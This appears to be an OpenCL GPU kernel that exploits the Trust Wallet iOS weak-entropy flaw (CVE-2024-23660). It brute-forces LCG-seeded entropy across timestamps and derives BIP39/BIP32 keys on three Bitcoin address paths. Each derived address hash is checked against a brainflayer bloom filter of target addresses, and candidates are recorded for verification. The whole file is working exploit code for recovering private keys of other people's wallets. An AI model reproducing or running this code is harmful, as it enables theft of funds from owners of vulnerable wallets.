// Trust Wallet iOS (CVE-2024-23660) — LCG Scanner with Brainflayer Bloom Filter
//
// Same LCG + BIP39 + BIP32 derivation as trust_wallet_lcg_crack.cl.
// Final step: bloom filter lookup instead of single-target hash160 comparison.
//
// Bloom filter format: raw bit-array, no header (brainflayer / hex2blf).
// Size: 2^32 bits = 512 MB.
//
// Check algorithm (k=5):
//   For each i in 0..5:
//     bit_index = LE_uint32(hash160[i*4 .. i*4+4])
//     if bit not set in bloom → NOT in set
//   All 5 bits set → candidate (bloom positive; verify on CPU)
//
// Global work size = 6 x range.
//   combo 0: VariantAnd + m/44'  (P2PKH)
//   combo 1: VariantMod + m/44'  (P2PKH)
//   combo 2: VariantAnd + m/84'  (P2WPKH)
//   combo 3: VariantMod + m/84'  (P2WPKH)
//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
//
// Result: results[n] = (ulong)timestamp | ((ulong)combo << 32)

__kernel void trust_wallet_lcg_bloom(
    __global ulong*       results,       // output: ts | (combo << 32)
    __global uint*        result_count,  // atomic hit counter
    __global const uchar* bloom,         // 512 MB raw bitarray
    uint   offset,                       // start_timestamp
    uint   range                         // timestamp count (bounds guard)
) {
    uint gid       = get_global_id(0);
    uint combo     = gid % 6u;
    uint ts_offset = gid / 6u;

    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    // ---- Entropy ----------------------------------------------------------
    uchar entropy[16];
    if ((combo & 1u) == 0u) {
        lcg_entropy_and(timestamp, entropy);
    } else {
        lcg_entropy_mod(timestamp, entropy);
    }

    // ---- Derivation path --------------------------------------------------
    uint purpose;
    if      (combo < 2u) purpose = 44u;
    else if (combo < 4u) purpose = 84u;
    else                 purpose = 49u;

    // ---- BIP39 + BIP32 ----------------------------------------------------
    uchar seed[64];
    bip39_entropy_to_seed_complete(entropy, seed);

    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    extended_private_key_t k_purpose;
    hardened_private_child_from_private(&mk, &k_purpose, purpose);

    extended_private_key_t k_coin;
    hardened_private_child_from_private(&k_purpose, &k_coin, 0u);

    extended_private_key_t k_account;
    hardened_private_child_from_private(&k_coin, &k_account, 0u);

    extended_private_key_t k_change;
    normal_private_child_from_private(&k_account, &k_change, 0u);

    extended_private_key_t k_addr;
    normal_private_child_from_private(&k_change, &k_addr, 0u);

    // ---- Hash160 ----------------------------------------------------------
    extended_public_key_t pub;
    public_from_private(&k_addr, &pub);

    uchar hash160[20];

    if (combo >= 4u) {
        // P2SH-P2WPKH: outer HASH160 of witness script
        uchar inner_h160[20];
        identifier_for_public_key(&pub, inner_h160);

        uchar witness_script[22] __attribute__((aligned(4)));
        witness_script[0] = 0x00;
        witness_script[1] = 0x14;
        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];

        uchar sha256_result[32] __attribute__((aligned(4)));
        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
        ripemd160(sha256_result, 32, (__private uchar*)hash160);
    } else {
        identifier_for_public_key(&pub, hash160);
    }

    // ---- Bloom filter check (k=5, brainflayer format) --------------------
    // Each of the 5 uint32-LE values from hash160 is a bit-index into
    // the 2^32-bit array.  All 5 bits must be set for a positive.
    bool in_bloom = true;
    for (int i = 0; i < 5; i++) {
        uint bit_idx = ((uint)hash160[i * 4])
                     | ((uint)hash160[i * 4 + 1] <<  8)
                     | ((uint)hash160[i * 4 + 2] << 16)
                     | ((uint)hash160[i * 4 + 3] << 24);
        uint byte_off = bit_idx >> 3;
        uint bit_pos  = bit_idx & 7u;
        if (!((bloom[byte_off] >> bit_pos) & 1u)) {
            in_bloom = false;
            break;
        }
    }

    if (in_bloom) {
        uint slot = atomic_inc(result_count);
        if (slot < 4096u) {
            results[slot] = (ulong)timestamp | ((ulong)combo << 32);
        }
    }
}
